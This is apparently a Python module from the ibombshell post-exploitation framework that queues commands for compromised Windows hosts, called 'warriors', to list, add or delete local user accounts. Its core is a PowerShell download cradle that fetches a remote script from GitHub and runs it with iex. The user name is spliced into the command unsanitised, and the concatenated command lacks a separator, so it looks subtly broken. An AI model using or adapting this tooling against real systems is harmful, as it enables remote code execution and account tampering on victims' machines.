from termcolor import cprint
from module import Module
from warrior_check import exist_warrior


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "Local Accounts",
                       "Description": "Deal with accounts",
                       "Author": "@josueencinar"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                   "option": ["get", "get, add or del", True],
                   "user": [None, "For add or del option", False]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        if exist_warrior(self.args["warrior"]):
            function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/data/functions/post/users')"
            op = self.args["option"]
            if op == "get":
                function += 'users -option get'
            elif op != "add" and op != "del":
                cprint("[!] Failed... wrong option", "red")
                return
            else:
                if self.args["user"]:
                    function += 'users -option ' + op + ' -user ' + self.args["user"]
                else:
                    cprint("[!] Failed... User?", "red")
                    return
            with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
                f.write(function)

            cprint ('[+] Done!', 'green')
        else:
            cprint ('[!] Failed... Warrior don´t found', 'red')